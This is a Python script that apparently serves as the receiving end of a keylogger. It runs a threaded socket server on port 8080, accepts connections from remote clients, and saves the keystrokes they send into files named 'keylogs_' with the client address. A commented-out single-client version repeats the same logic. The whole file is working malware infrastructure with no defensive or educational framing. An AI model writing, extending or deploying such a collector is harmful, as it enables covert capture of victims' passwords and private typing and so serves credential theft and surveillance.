import socket
import threading
import time


# while True:
#     s = socket.socket()
#     print("")
#     print("Socket created.")

#     port = 8080
#     s.bind(('0.0.0.0', port))
#     print("Socket binded to ", port)

#     s.listen(5)
#     print("Socket is listening...")

#     c, addr = s.accept()
#     print("Got connection from ", addr)

#     f = open(f"keylogs_{addr}.txt", "w")
    
#     while True:
#         try:
#             key = c.recv(1024).decode()
#             if len(key)==0:
#                 print("")
#                 print("Client must have disconnected.")
#                 f.close()
#                 break
#             print(key, end="", flush=True)
#             f.write(key)
#         except :
#             print("")
#             print("Exception. Closing server...")
#             f.close()
#             break
        
#     c.close()
#     s.close()
        

def print_waitmsg(wait_msg):
    wait_msgs = [
        f"{wait_msg}   ",
        f"{wait_msg}.   ",
        f"{wait_msg}..   ",
        f"{wait_msg}...   "
    ]
    while True:
        for msg in wait_msgs:
            print(msg, end='\r', flush=True)
            time.sleep(0.3)

def handle_client(conn, addr):
    print("Got connection from ", addr)
    f = open(f"keylogs_{addr}.txt", "w")

    while True:
        try:
            key = conn.recv(1024).decode()
            if len(key)==0:
                print("")
                print("Client must have disconnected.")
                f.close()
                break
            print(key, end="", flush=True)
            f.write(key)
        except :
            print("")
            print("Exception. Closing server...")
            f.close()
            break


def start_server():
    s = socket.socket()
    s.settimeout(1)
    s.bind(('0.0.0.0', 8080))
    print("Socket binded to 8080")
    print("")
    s.listen(5)
    # print_waitmsg("Socket is listening")
    waitmsg_thread = threading.Thread(target=print_waitmsg, args=("Socket is listening",))
    waitmsg_thread.start()
    
    while s:
        try:
            connection, address = s.accept()
            client_thread = threading.Thread(target=handle_client, args=(connection, address))
            client_thread.start()
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            print("")
            print("Server closing...")
            s.close()
            exit()

start_server()